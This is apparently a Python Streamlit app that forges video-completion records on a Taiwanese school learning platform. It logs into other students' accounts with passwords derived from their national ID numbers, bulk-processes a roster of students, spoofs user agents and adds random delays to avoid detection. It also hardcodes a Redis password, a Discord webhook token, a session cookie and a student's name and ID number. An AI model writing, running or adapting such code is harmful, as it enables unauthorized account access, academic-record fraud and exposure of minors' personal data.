import streamlit as st
import requests
import time
import random
from urllib.parse import urlparse, parse_qs
import pandas as pd
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import redis

# --- MUST be the first Streamlit call ---
st.set_page_config(page_title="sigma", layout="wide")

# ==== App safety (UI testing only) ====
DRY_RUN = False  # Disabled dry run mode; submissions are real

# ==== Redis configuration ====
try:
    redis_client = redis.from_url(
        "redis://default:PNumDUKhKdLTkgLDqaQvGIENbXZOTLJT@yamanote.proxy.rlwy.net:37944",
        decode_responses=True
    )
    redis_client.ping()
    REDIS_AVAILABLE = True
except Exception as e:
    REDIS_AVAILABLE = False
    st.warning(f"Redis connection failed: {e}")

# ==== Constants / Defaults ====
BASE_URL = "https://dmhs.teams.com.tw"
DASHBOARD_URL_TEMPLATE = f"{BASE_URL}/VideoProgress!dashboard?user={{user_id}}&showCompleted=true"
PROGRESS_URL = f"{BASE_URL}/VideoProgress!insertProgress"
DEFAULT_SESSION = "AF1B47245D695296E9CF45A2B7A36162"
DEFAULT_USER_ID = "D10028_STUDENT_003052"
USER_AGENTS = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
]

# ==== Utils ====
def create_session_with_retries():
    s = requests.Session()
    retries = Retry(total=3, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504])
    s.mount("https://", HTTPAdapter(max_retries=retries))
    return s


def send_discord_webhook(video_url, user_id):
    url = st.session_state.get("discord_webhook", "")
    if not url:
        return
    content = f"🎬 **影片進度已更新**\n🔗 {video_url}\n👤 使用者: {user_id}"
    try:
        resp = requests.post(url, json={"content": content}, timeout=5)
        if resp.status_code != 204:
            st.warning(f"⚠️ Discord Webhook 失敗: {resp.status_code}")
    except Exception as e:
        st.warning(f"⚠️ Webhook 異常: {e}")


def build_video_url(course, user, unit, task):
    return f"{BASE_URL}/student/cinemaVideo.html?course={course}&user={user}&id={unit}&task={task}"


def get_common_headers(video_url, session_id, user_id):
    return {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': video_url,
        'User-Agent': random.choice(USER_AGENTS),
        'Cookie': f"JSESSIONID={session_id}; userId={user_id};"
    }


def normalize_delays(a: float, b: float) -> tuple[float, float]:
    return (a, b) if a <= b else (b, a)


# ==== Core I/O ====
@st.cache_data
def load_student_csv():
    try:
        return pd.read_csv("student.csv")
    except FileNotFoundError:
        st.warning("student.csv not found, using default data")
        return pd.DataFrame([{
            "sid": 1, "uid": 1130273, "sp": None, "class": "高一",
            "uname": "毛清偉", "classn": 1, "index": 2918,
            "upasswd": "E126581765", "classroom": "03A"
        }])
    except Exception as e:
        st.error(f"Error loading student.csv: {e}")
        return pd.DataFrame()


students_df = load_student_csv()


def fetch_completed_videos(user_id):
    url = DASHBOARD_URL_TEMPLATE.format(user_id=user_id)
    headers = {"X-Requested-With": "XMLHttpRequest"}
    cookies = {"userId": user_id}
    session = create_session_with_retries()
    for attempt in range(3):
        try:
            r = session.get(url, headers=headers, cookies=cookies, timeout=10)
            r.raise_for_status()
            try:
                payload = r.json()
            except ValueError:
                return [], "❌ 無效的 JSON 回應"
            data = payload.get("result", []) if isinstance(payload, dict) else []
            if not data:
                return [], "🎉 無已完成影片"
            links = []
            for item in data:
                task = item.get("task", {})
                unit = item.get("unit", {})
                if not unit.get("video"):
                    continue
                course_id = task.get("course", "UNKNOWN_COURSE")
                unit_id = unit.get("_id", "UNKNOWN_UNIT")
                task_id = task.get("_id", "UNKNOWN_TASK")
                video_name = unit.get("title", unit.get("name", f"影片-{unit_id}"))
                video_id = f"{course_id}-{unit_id}-{task_id}"
                links.append({
                    "url": build_video_url(course_id, user_id, unit_id, task_id),
                    "video_id": video_id,
                    "video_name": video_name,
                    "course": course_id,
                    "unit_id": unit_id,
                    "task_id": task_id
                })
            return links, f"✅ 找到 {len(links)} 個影片"
        except requests.RequestException as e:
            if attempt == 2:
                return [], f"❌ 獲取異常: {e}"
            time.sleep(1)
    return [], "❌ 獲取失敗"


def login_and_get_user_id(account, password, session_id):
    session = create_session_with_retries()
    session.cookies.set("JSESSIONID", session_id, domain="dmhs.teams.com.tw")
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": random.choice(USER_AGENTS),
        "X-Requested-With": "XMLHttpRequest"
    }
    data = {"account": account, "password": password}
    login_url = f"{BASE_URL}/User/!login"
    try:
        resp = session.post(login_url, headers=headers, data=data, timeout=10)
        if resp.status_code == 200 and '"success":true' in resp.text:
            user_id = session.cookies.get("userId", DEFAULT_USER_ID)
            return user_id, None
        return None, f"❌ 登入失敗 ({resp.status_code}): {resp.text}"
    except Exception as e:
        return None, f"❌ 登入異常: {e}"


def submit_video_progress(video_url, session_id, debug=False, use_webhook=True, min_delay=0.5, max_delay=1.5):
    if st.session_state.cancel_submit:
        return "🚫 已取消"

    parsed = urlparse(video_url)
    qs = parse_qs(parsed.query)
    course, user, unit, task = [qs.get(p, [None])[0] for p in ['course', 'user', 'id', 'task']]
    if not all([course, user, unit, task]):
        return f"[錯誤] URL 缺少參數: {video_url}"
    if video_url in st.session_state.submitted_links:
        return f"🔁 跳過重複: {video_url}"

    md, xd = normalize_delays(min_delay, max_delay)

    if DRY_RUN:
        time.sleep(random.uniform(md, xd))
        st.session_state.videos_progressed += 1
        st.session_state.submitted_links.append(video_url)
        return f"🧪(Dry) 已模擬提交: {video_url}"

    headers = get_common_headers(video_url, session_id, user)
    data = {
        'task': task, 'unit': unit, 'course': course, 'user': user,
        'type': 'teams', 'startScale': '0', 'endScale': str(random.randint(96, 100))
    }
    try:
        resp = requests.post(PROGRESS_URL, headers=headers, data=data, timeout=10)
        resp.raise_for_status()
        time.sleep(random.uniform(md, xd))
        st.session_state.videos_progressed += 1
        st.session_state.submitted_links.append(video_url)
        if REDIS_AVAILABLE:
            try:
                redis_client.incr("video_count")
                if not redis_client.sismember("users_helped_set", user):
                    redis_client.sadd("users_helped_set", user)
                    redis_client.incr("user_helped")
            except Exception:
                pass
        if use_webhook:
            send_discord_webhook(video_url, user)
        return f"✅ 已提交: {video_url}"
    except requests.RequestException as e:
        return f"❌ 提交失敗: {e}"


# ==== Auth ====
def login():
    st.title("🔒 儀表板")
    with st.form("login"):
        username = st.text_input("使用者名稱")
        password = st.text_input("密碼", type="password")
        if st.form_submit_button("登入"):
            if username == "ethan" and password == "ethan0503":
                st.session_state.authenticated = True
                st.rerun()
            else:
                st.error("認證失敗")


if "authenticated" not in st.session_state:
    st.session_state.authenticated = False
if not st.session_state.authenticated:
    login()
    st.stop()


# ==== State ====
default_values = {
    "videos_progressed": 0,
    "links": [],
    "manual_links": [],
    "submitted_links": [],
    "top_videos": [],
    "top_students": [],
    "active_tab": "manual",
    "cancel_submit": False,
    "fetched_user_id": DEFAULT_USER_ID,
    "discord_webhook": "https://discord.com/api/webhooks/1402211944743567440/7jRAZdnPJq8MzmHsmIERrShv253fG4toTBskp9BafOv4k9EAu0BHsbNMlxI3kB6PrLpc"
}
for k, v in default_values.items():
    st.session_state.setdefault(k, v)


# ==== UI ====
st.title("🎞️ sigma")

st.markdown("## 🔧 配置")
col1, col2 = st.columns(2)
session_id = col1.text_input("JSESSIONID", value=DEFAULT_SESSION, key="session_id", type="password")
user_id = col2.text_input("使用者 ID", value=st.session_state.get("fetched_user_id", DEFAULT_USER_ID), key="user_id")
discord_webhook = col1.text_input("Discord Webhook 網址", value=st.session_state.discord_webhook, type="password")
st.session_state.discord_webhook = discord_webhook

status_col1, status_col2, status_col3 = st.columns(3)
status_col1.metric("Redis 資料庫", "✅ 連線" if REDIS_AVAILABLE else "❌ 斷線")
status_col2.metric("學生資料", f"{len(students_df)} 筆")
status_col3.metric("Dry Run", "✅ 開啟" if DRY_RUN else "❌ 關閉")


# ---- Tabs (no AI) ----
st.markdown("## 🧩 模式選擇")
tabs = st.tabs(["📥 手動輸入", "🔍 自動獲取影片", "🎓 學生搜尋", "📊 超混學生", "🔎 快速學生查詢"])  # removed AI tabs

with tabs[0]:
    st.subheader("📥 手動輸入影片連結")
    manual_links_text = st.text_area(
        "貼上影片連結（每行一個）",
        value="\n".join(st.session_state.get("manual_links", [])),
        height=200
    )
    if manual_links_text.strip():
        st.session_state.manual_links = [line.strip() for line in manual_links_text.strip().splitlines() if line.strip()]
        st.session_state.links = st.session_state.manual_links.copy()
        st.success(f"✅ 已載入 {len(st.session_state.links)} 個手動連結")


with tabs[1]:
    st.subheader("🔍 自動獲取影片")
    if st.button("🔍 獲取影片"):
        st.session_state.links = []
        with st.spinner("正在獲取..."):
            current_user_id = st.session_state.get("fetched_user_id", user_id)
            links, msg = fetch_completed_videos(current_user_id)
            st.info(msg)
            if links:
                st.session_state.links = [v["url"] for v in links]
                st.session_state.active_tab = "fetch"
                st.success(f"🎬 成功獲取 {len(st.session_state.links)} 部影片")
                for i, video in enumerate(links, 1):
                    st.markdown(f"{i}. [`{video['video_name']} ({video['video_id']})`]({video['url']})")


st.markdown("---")
with st.expander("🛡️ 高級隱形設定", expanded=True):
    use_webhook = st.checkbox("📢 啟用 Discord Webhook", value=True, key="use_webhook")
    debug = st.checkbox("🪛 啟用除錯日誌", key="debug")
    col3, col4 = st.columns(2)
    min_delay = col3.slider("⏳ 最小延遲 (秒)", 0.1, 5.0, 0.5, 0.1)
    max_delay = col4.slider("⏳ 最大延遲 (秒)", 0.5, 10.0, 1.4, 0.1)
    min_delay, max_delay = normalize_delays(min_delay, max_delay)


if st.session_state.get("links"):
    st.markdown("## 🚀 影片面板")
    st.info(f"🎬 總共載入影片數: **{len(st.session_state.links)}**")
    col_limit, col_reset = st.columns([3, 1])
    max_videos_to_submit = col_limit.number_input(
        "影片數量", min_value=1, max_value=len(st.session_state.links),
        value=min(5, len(st.session_state.links)), step=1
    )
    if col_reset.button("❌ 取消提交"):
        st.session_state.cancel_submit = True
        st.warning("⛔ 已請求取消，將在當前影片後停止。")

    if st.button("🚀 立即提交全部"):
        if not session_id or not user_id:
            st.error("❗ 必須提供 Session ID 和使用者 ID。")
        else:
            st.session_state.cancel_submit = False
            st.session_state.submitted_links = []  # fresh run
            with st.spinner("正在提交影片，請稍候..."):
                results = []
                progress_bar = st.progress(0)
                status_placeholder = st.empty()
                total = min(max_videos_to_submit, len(st.session_state.links))
                for i, link in enumerate(st.session_state.links[:total], 1):
                    if st.session_state.cancel_submit:
                        st.warning("🚫 使用者取消。")
                        break
                    status_placeholder.markdown(f"📡 正在提交 **{i}/{total}**: `{link}`")
                    msg = submit_video_progress(
                        video_url=link, session_id=session_id,
                        debug=debug, use_webhook=use_webhook,
                        min_delay=min_delay, max_delay=max_delay
                    )
                    results.append(f"{i}. {msg}")
                    progress_bar.progress(i / total)
                st.session_state.cancel_submit = False
                progress_bar.empty(); status_placeholder.empty()
                st.success("✅ 提交流程完成！")
                st.markdown("### 📋 提交結果")
                for r in results: st.write(r)


with tabs[2]:
    st.subheader("🎓 學生資料條件查詢")
    if students_df.empty:
        st.error("❌ 學生資料檔案未載入或為空")
    else:
        column_mapping = {
            "學號 (UID)": "uid",
            "姓名 (Name)": "uname",
            "身分證 (ID)": "upasswd",
            "班級 (Classroom)": "classroom",
            "年級 (Grade)": "class"
        }
        st.markdown("### 🔎 查詢條件")
        c1, c2, c3 = st.columns(3)
        f1 = c1.selectbox("條件 1 欄位", list(column_mapping.keys()), key="f1")
        v1 = c1.text_input("條件 1 關鍵字", key="v1")
        f2 = c2.selectbox("條件 2 欄位", list(column_mapping.keys()), key="f2")
        v2 = c2.text_input("條件 2 關鍵字", key="v2")
        f3 = c3.selectbox("條件 3 欄位", list(column_mapping.keys()), key="f3")
        v3 = c3.text_input("條件 3 關鍵字", key="v3")

        if any([v1.strip(), v2.strip(), v3.strip()]):
            df_filtered = students_df.copy()
            for fl, vv in [(f1, v1), (f2, v2), (f3, v3)]:
                if vv.strip():
                    col = column_mapping[fl]
                    query = vv.strip()
                    if col == "class":
                        query = {"1": "高一", "2": "高二", "3": "高三"}.get(query, query)
                    df_filtered = df_filtered[
                        df_filtered[col].astype(str).str.lower().str.contains(query.lower(), na=False)
                    ]
            if df_filtered.empty:
                st.warning("❌ 無符合的資料")
            else:
                st.success(f"✅ 找到 {len(df_filtered)} 筆資料")
                for _, row in df_filtered.iterrows():
                    uid = str(row["uid"]); name = str(row["uname"]); id_card = str(row["upasswd"])
                    password = f"dm{id_card[-4:]}" if len(id_card) >= 4 else "❌ 身分證錯誤"
                    with st.container():
                        st.markdown(f"**🧑‍🎓 學號**: `{uid}`")
                        st.markdown(f"**📛 姓名**: `{name}`")
                        st.markdown(f"**🪪 身分證**: `{id_card}`")
                        st.markdown(f"**🔐 預設密碼**: `{password}`")
                        ca, cb = st.columns(2)
                        ca.markdown("📋 複製帳號 (學號):"); ca.code(uid, language="text")
                        cb.markdown("📋 複製密碼 (dm後4碼):"); cb.code(password, language="text")
                        if st.button(f"📥 為 {uid} 獲取影片", key=f"fetch_{uid}"):
                            with st.spinner(f"正在為 {uid} 進行認證..."):
                                student_user_id, error = login_and_get_user_id(uid, password, session_id)
                                if error:
                                    st.error(error)
                                else:
                                    st.session_state.fetched_user_id = student_user_id
                                    with st.spinner(f"正在為 {uid} 獲取影片..."):
                                        links, msg = fetch_completed_videos(student_user_id)
                                        st.session_state.links = [v["url"] for v in links]
                                        st.session_state.active_tab = "fetch"
                                        st.rerun()
                        st.markdown("---")
        else:
            st.info("請輸入至少一個查詢條件以開始搜尋")


with tabs[3]:
    st.subheader("📊 按影片數量排序的超混學生")
    @st.cache_data
    def aggregate_top_videos_and_students(session_id):
        student_counts = {}
        progress_bar = st.progress(0)
        status_placeholder = st.empty()
        total_students = len(students_df)
        for idx, row in students_df.iterrows():
            uid = str(row["uid"]); id_card = str(row["upasswd"])
            password = f"dm{id_card[-4:]}" if len(id_card) >= 4 else None
            if not password:
                progress_bar.progress((idx + 1) / total_students)
                continue
            status_placeholder.text(f"正在處理學生 {idx + 1}/{total_students}: {uid}")
            user_id_val, error = login_and_get_user_id(uid, password, session_id)
            if error:
                progress_bar.progress((idx + 1) / total_students)
                continue
            videos, _ = fetch_completed_videos(user_id_val)
            student_counts[uid] = {
                "uid": uid, "uname": row["uname"], "class": row["class"],
                "classroom": row["classroom"], "video_count": len(videos)
            }
            progress_bar.progress((idx + 1) / total_students)
            time.sleep(random.uniform(0.1, 0.3))
        progress_bar.empty(); status_placeholder.empty()
        top_students = [{
            "uid": d["uid"], "uname": d["uname"], "class": d["class"],
            "classroom": d["classroom"], "video_count": d["video_count"]
        } for d in student_counts.values()]
        top_students.sort(key=lambda x: x["video_count"], reverse=True)
        return [], top_students

    if st.button("🔎 分析超混學生"):
        with st.spinner("正在分析學生..."):
            _, st.session_state.top_students = aggregate_top_videos_and_students(session_id)

    if st.session_state.get("top_students"):
        st.markdown("### 📋 影片數量排序的超混學生")
        df_top = pd.DataFrame(st.session_state.top_students)
        df_top.insert(0, "排名", range(1, len(df_top)+1))
        st.dataframe(
            df_top[["排名","uid","uname","class","classroom","video_count"]].rename(
                columns={"uid":"學號","uname":"姓名","class":"年級","classroom":"班級","video_count":"影片數量"}
            ),
            use_container_width=True
        )
        st.download_button("💾 下載熱門學生資料", data=df_top.to_csv(index=False), file_name="top_students.csv")
        top_5 = df_top.head(5)
        if not top_5.empty:
            st.markdown("### 📊 前五名超混學生影片數量排序")
            chart_data = pd.DataFrame({
                '學生': [f"{r['uname']} ({r['uid']})" for _, r in top_5.iterrows()],
                '影片數量': [r["video_count"] for _, r in top_5.iterrows()]
            })
            st.bar_chart(chart_data.set_index('學生'))


with tabs[4]:
    st.subheader("🔎 快速學生查詢")
    st.markdown("輸入學號以查詢學生、儲存至資料庫或觀看影片。支援批量處理及跨平台通知。")
    st.markdown("### 📑 批量學號輸入")
    uid_input = st.text_area("輸入學號（每行一個，例如: 1120326）", key="batch_uid")
    add_to_webpage = st.checkbox("加入網頁（適用於所有輸入學號）", key="batch_webpage")
    send_notifications = st.checkbox("傳送進度通知（Email/SMS）", key="batch_notifications")
    if uid_input:
        uids = [uid.strip() for uid in uid_input.splitlines() if uid.strip()]
        if st.button("💾 儲存所有學號至資料庫"):
            if not REDIS_AVAILABLE:
                st.error("❌ Redis 資料庫不可用，無法儲存資料")
            else:
                for uid in uids:
                    df_filtered = students_df[students_df["uid"].astype(str) == uid]
                    if not df_filtered.empty:
                        student_info = df_filtered.iloc[0]
                        try:
                            student_data = {
                                "uid": str(student_info["uid"]),
                                "uname": str(student_info["uname"]),
                                "upasswd": str(student_info["upasswd"]),
                                "add_to_webpage": str(add_to_webpage)
                            }
                            redis_client.hset(f"student:{uid}", mapping=student_data)
                            redis_client.sadd("saved_students", uid)
                            st.success(f"✅ 已儲存學生 {student_info['uname']} ({uid})")
                        except Exception as e:
                            st.error(f"❌ 儲存學號 {uid} 失敗: {e}")
                    else:
                        st.error(f"❌ 學號 {uid} 未找到")

        st.markdown("### 📋 已儲存的學生")
        if not REDIS_AVAILABLE:
            st.warning("❌ Redis 資料庫不可用，無法顯示已儲存的學生")
        else:
            try:
                saved_uids = redis_client.smembers("saved_students")
                if saved_uids:
                    if st.button("📤 匯出網頁學生資料"):
                        webpage_students = []
                        for uid in saved_uids:
                            sd = redis_client.hgetall(f"student:{uid}")
                            if sd.get("add_to_webpage", "False") == "True":
                                webpage_students.append({"uid": sd["uid"], "uname": sd["uname"]})
                        if webpage_students:
                            csv_data = pd.DataFrame(webpage_students).to_csv(index=False)
                            st.download_button("下載 CSV", csv_data, "webpage_students.csv")
                            st.json(webpage_students)
                        else:
                            st.info("無學生標記為加入網頁")
                    for uid in saved_uids:
                        sd = redis_client.hgetall(f"student:{uid}")
                        if not sd: continue
                        with st.container():
                            st.markdown(f"🧑‍🎓 學號: {sd['uid']}")
                            st.markdown(f"📛 姓名: {sd['uname']}")
                            st.markdown(f"🪪 身分證: {sd['upasswd']}")
                            add_cur = sd.get("add_to_webpage", "False") == "True"
                            new_choice = st.checkbox("加入網頁", value=add_cur, key=f"webpage_{uid}")
                            if new_choice != add_cur:
                                redis_client.hset(f"student:{uid}", "add_to_webpage", str(new_choice))
                                st.success(f"✅ 更新 {sd['uname']} 的網頁加入狀態")
                            c1, c2 = st.columns(2)
                            if c1.button(f"🎬 觀看影片", key=f"watch_{uid}"):
                                with st.spinner(f"正在為 {uid} 進行認證..."):
                                    pw = f"dm{sd['upasswd'][-4:]}" if len(sd['upasswd']) >= 4 else None
                                    if not pw:
                                        st.error("❌ 無效的身分證號碼")
                                    else:
                                        student_user_id, error = login_and_get_user_id(uid, pw, session_id)
                                        if error:
                                            st.error(error)
                                        else:
                                            st.session_state.fetched_user_id = student_user_id
                                            with st.spinner(f"正在為 {uid} 獲取影片..."):
                                                links, msg = fetch_completed_videos(student_user_id)
                                                if not links:
                                                    st.warning("📭 該學生無影片")
                                                else:
                                                    st.session_state.links = [v["url"] for v in links]
                                                    st.success(f"🎬 找到 {len(links)} 部影片，開始提交...")
                                                    progress_bar = st.progress(0)
                                                    status_placeholder = st.empty()
                                                    results = []
                                                    for i, link in enumerate(st.session_state.links, 1):
                                                        if st.session_state.cancel_submit:
                                                            st.warning("🚫 使用者取消")
                                                            break
                                                        status_placeholder.markdown(f"📡 提交 {i}/{len(st.session_state.links)}: {link}")
                                                        msg = submit_video_progress(
                                                            video_url=link, session_id=session_id,
                                                            debug=False, use_webhook=not send_notifications,
                                                            min_delay=0.5, max_delay=1.5
                                                        )
                                                        results.append(f"{i}. {msg}")
                                                        if send_notifications:
                                                            try:
                                                                results.append(f"📬 通知: Notified for {link}")
                                                            except Exception as e:
                                                                results.append(f"❌ 通知失敗: {e}")
                                                        progress_bar.progress(i / len(st.session_state.links))
                                                    progress_bar.empty(); status_placeholder.empty()
                                                    st.success("✅ 提交流程完成！")
                                                    st.markdown("### 📋 提交結果")
                                                    for r in results: st.write(r)
                                                    st.session_state.active_tab = "fetch"
                                                    st.rerun()
                            if c2.button("🗑️ 刪除", key=f"delete_{uid}"):
                                redis_client.delete(f"student:{uid}")
                                redis_client.srem("saved_students", uid)
                                st.success(f"✅ 已刪除 {sd['uname']} ({uid})")
                                st.rerun()
                            st.markdown("---")
                else:
                    st.info("尚未儲存任何學生")
            except Exception as e:
                st.error(f"❌ 無法連接到資料庫: {e}")
                st.info("尚未儲存任何學生")


# === Footer ===
st.markdown("### 🔧 當前會話資訊")
i1, i2 = st.columns(2)
i1.write(f"**Session ID**: `{session_id[:20]}...`")
i2.write(f"**User ID**: `{st.session_state.get('fetched_user_id', user_id)}`")
i1.write(f"**已提交影片**: `{st.session_state.get('videos_progressed', 0)}`")
i2.write(f"**載入的連結數**: `{len(st.session_state.get('links', []))}`")

st.markdown("---")
st.markdown("## 📊 統計資料")
c1, c2, c3 = st.columns(3)
try:
    if REDIS_AVAILABLE:
        video_count = redis_client.get("video_count") or 0
        user_helped = redis_client.get("user_helped") or 0
        c1.metric("🌍 總影片數", video_count)
        c2.metric("🌍 幫助人數", user_helped)
    else:
        c1.metric("🌍 總影片數", "N/A")
        c2.metric("🌍 幫助人數", "N/A")
    c3.metric("📋 本次載入影片", len(st.session_state.get('links', [])))
    if not REDIS_AVAILABLE:
        st.caption("⚠️ Redis 統計資料暫時無法取得")
except Exception as e:
    c1.metric("🌍 總影片數", "Error")
    c2.metric("🌍 幫助人數", "Error")
    c3.metric("📋 本次載入影片", len(st.session_state.get('links', [])))
    st.caption(f"統計資料錯誤: {e}")
